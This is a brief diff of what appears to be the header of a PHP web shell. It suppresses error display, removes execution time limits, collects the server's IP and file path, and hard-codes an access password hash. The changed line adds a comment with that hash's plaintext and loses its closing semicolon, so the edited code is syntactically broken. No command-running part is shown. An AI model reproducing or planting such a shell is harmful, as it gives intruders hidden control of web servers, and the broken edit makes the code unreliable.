@@ -11,7 +11,7 @@ if(version_compare(PHP_VERSION, '5.3.0', '<')) {
 @ini_set('max_execution_time',0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
-$password = "fa128332ba0c2ace04c249f2b4b7f464"; 
+$password = "fa128332ba0c2ace04c249f2b4b7f464"// md5: ph.luffy1337
 $SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
 $FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
 if(!empty($_SERVER['HTTP_USER_AGENT'])) {
